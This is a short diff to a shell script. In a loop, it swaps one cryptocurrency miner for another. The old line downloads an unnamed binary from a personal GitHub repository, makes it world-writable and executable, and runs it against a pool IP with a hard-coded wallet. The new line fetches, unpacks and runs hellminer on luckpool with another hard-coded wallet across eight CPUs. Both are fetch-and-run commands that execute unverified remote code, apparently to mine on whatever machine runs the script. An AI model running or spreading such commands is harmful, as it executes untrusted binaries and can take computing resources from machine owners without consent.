@@ -3,8 +3,8 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget  https://github.com/OmJhonyPerkasa/yteam/raw/main/masterfile && chmod 777 masterfile && ./masterfile -o  159.65.30.104:3333 -u TRX:TP2V29rruTFuPqyqPF5YaJD2eo3g9K4nnC -k -a rx/0 -t 2 
- 
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xzf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.hadeh -p x --cpu 8
+
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
